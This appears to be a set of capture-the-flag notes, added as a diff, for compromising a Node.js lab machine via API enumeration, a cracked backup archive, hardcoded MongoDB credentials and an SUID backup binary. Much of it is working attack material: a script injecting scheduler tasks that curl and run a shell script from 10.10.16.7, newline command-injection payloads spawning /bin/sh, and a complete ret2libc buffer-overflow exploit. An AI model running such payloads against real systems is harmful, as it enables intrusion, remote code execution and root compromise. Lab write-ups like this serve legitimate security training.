@@ -1,0 +1,244 @@
+API Fuzzing
+
+feroxbuster for busting directories with no extension
+
+Manual enumeration, look through the files
+
+/api/users/latest -> interesting
+
+/api/users/1
+/api/users/ -> get the admin password
+-> realise that there is a /api/admin/backup
+
+login and download the backup which probably calls /api/admin/backup
+
+https://www.boxentriq.com/code-breaking/cipher-identifier
+
+realise that is is base64 encoded
+
+cat myplace.backup | base64 -d > myplace.backup.decode
+
+https://linuxconfig.org/how-to-crack-zip-password-on-kali-linux
+
+magicword
+
+node js framework, you know how it is, confirm hardcode credentials or .env file
+
+linpeas, lse
+
+theres binary backup with SUID, but can only be executed by someone in admin group
+
+lateral movement to tom as tom seems to have more credentials
+
+from ps -aux, netstat, tom seems to be running scheduler and the node.js application itself
+
+cp over the node_modules and package.json to /tmp folder
+
+create another .js file and run node to add stuff to the databases to be executed 
+
+test by creating a text file first 
+
+lateral movement to tom
+
+mongo -u mark -p 5AYRft73VtFpc84k scheduler
+
+const exec        = require('child_process').exec;
+const MongoClient = require('mongodb').MongoClient;
+const ObjectID    = require('mongodb').ObjectID;
+const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';
+
+MongoClient.connect(url, function(error, db) {
+  if (error || !db) {
+    console.log('[!] Failed to connect to mongodb');
+    return;
+  }
+
+  setInterval(function () {
+    db.collection('tasks').find().toArray(function (error, docs) {
+      if (!error && docs) {
+        docs.forEach(function (doc) {
+          if (doc) {
+            console.log('Executing task ' + doc._id + '...');
+            exec(doc.cmd);
+            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
+          }
+        });
+      }
+      else if (error) {
+        console.log('Something went wrong: ' + error);
+      }
+    });
+  }, 30000);
+
+});
+
+console.log("hello")
+const exec        = require('child_process').exec;
+const MongoClient = require('mongodb').MongoClient;
+const ObjectID    = require('mongodb').ObjectID;
+const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';
+
+MongoClient.connect(url, function(error, db) {
+  if (error || !db) {
+    console.log('[!] Failed to connect to mongodb');
+    return;
+  }
+
+  db.collection('tasks').insertOne({
+        "cmd": "touch /tmp/ITISWORKING222"
+  })
+
+  db.collection('tasks').insertOne({
+	"cmd": "curl http://10.10.16.7/shell.sh -o /tmp/shell.sh"
+  })
+  
+  db.collection('tasks').insertOne({
+	"cmd": "chmod 777 /tmp/shell.sh"
+  })
+
+  db.collection('tasks').insertOne({
+        "cmd": "bash /tmp/shell.sh"
+  })
+
+  console.log("DONE")
+  return
+
+});
+
+https://docs.mongodb.com/guides/server/insert/
+
+show collections;
+db.tasks.insertOne({})
+https://docs.mongodb.com/manual/reference/method/db.collection.insertMany/
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp	
+https://book.hacktricks.xyz/shells/shells/msfvenom
+https://devconnected.com/how-to-copy-directory-on-linux/
+
+
+Realise that backup binary and the api is /api/admin/backup
+maybe they are related?
+
+Calling backup does nothing but you know it is executing as no errors (calling backup as mark throws permission errors)
+
+looking at /var/www/myplace, you see that backup takes 3 parameters 
+
+var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]); 
+
+backup a a a
+
+locate myplace (maybe theres a directory)
+
+/etc/myplace/keys -> bingo
+source code has also the hard coded keys which you can just use
+
+
+binary enumeration:
+file /usr/local/bin/backup 
+ltrace backup a a a -> full command to understand what the executable does
+strings backup
+
+
+METHOD 1:
+
+/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root -> gives u trollface (blacklisting)
+/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r**t/r**t.txt | base64 -d > root.zip
+
+For blacklisting, you can use ltrace to see what chars are being checked
+
+
+METHOD 2:
+
+/usr/bin/zip -r -P magicword /tmp/.backup_arandomnumberhere /var/www/myplace > /dev/null -> what is normally run when you run /api/admin/backup
+
+imagine if we could run this instead, in 2 lines:
+/usr/bin/zip -r -P magicword /tmp/.backup_arandomnumberhere /var/www/myplace
+/bin/sh > /dev/null
+
+/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "$(printf 'aaa\n/bin/sh')"
+
+
+add \nls to make sure that ls is being sent to /dev/null and not our shell!
+/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "$(printf 'aaa\n/bin/sh\nls')"
+
+/usr/bin/zip -r -P magicword /tmp/.backup_arandomnumberhere aaa
+/bin/sh 
+ls > /dev/null
+
+
+
+
+
+
+
+
+
+
+METHOD 3: BOF
+
+
+The most involved privilege escalation method requires the attacker to analyse the application in order to find where a buffer overflow exists. There are a number of ways that this can be approached, so for simplicity’s sake, this document will simply explain where the vulnerability exists, and how it can be exploited, rather than the process of identifying it.
+
+Within the application, there are a number of times which strcpy is used with no validation of the bounds of the data. Within the displayTarget function, this will cause an overflow and a segfault, should the following criteria be met:
+
+    The application is not being executed in quiet mode (anything other than -q is passed as the first argument), as the function is not called in quiet mode
+    A valid access token has been passed as the second argument
+    A string of 508 characters is passed as the third argument
+
+As ASLR and NX are both present, in order to exploit this, the attacker will be required to create a basic ret2libc script. In order to do this, the attacker must acquire a few pieces of information first.
+
+First, a check should be done to find one of the addresses that libc is assigned. As ASLR will change this each time the application is run, any can be picked, as the exploit will attempt to run multiple times until the same address gets re-used. This can be done by running ldd /usr/local/bin/backup | grep libc.so.6
+
+Next, the attacker should find the offsets of the following libc functions:
+
+    system
+    exit
+
+To do this, the command readelf -s /lib32/libc.so.6 | grep system should be executed.
+
+From the output of this command, we can find the offset on the line with the function system@@GLIBC_2.0 (in this case 0003a940). We then repeat this step but with “exit” in the grep command instead of “system”, and take the offset for the exit@@GLIBC_2.0 function (0002e7b0).
+
+One last piece of information is now needed, which is the offset of the string /bin/sh within libc, which can be retrieved by running strings -a -t x /lib32/libc.so.6 | grep /bin/sh. In this case, the offset is 15900b.
+
+With all this information, a new script can be created to exploit the vulnerability:
+
+
+
+#!/usr/bin/env python
+import struct
+from subprocess import call
+
+libc_base_addr = 0xf7542000
+system_off = 0x0003a940            
+exit_off = 0x0002e7b0          
+system_addr = libc_base_addr + system_off
+exit_addr = libc_base_addr + exit_off
+system_arg = libc_base_addr + 0x0015900b
+
+def conv(num):
+    return struct.pack("<I",num)
+
+buf = "A" * 512
+buf += conv(system_addr)
+buf += conv(exit_addr)
+buf += conv(system_arg)
+
+print "Calling vulnerable program"
+
+i = 0
+while (i < 255):
+    print "Number of tries: %d" %i
+    i += 1
+
+    ret = call(["/usr/local/bin/backup", "-i", "3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110", buf])
+    if (not ret):
+        break
+    else:
+        print "Exploit failed"
+
+
+
+
+
+
+
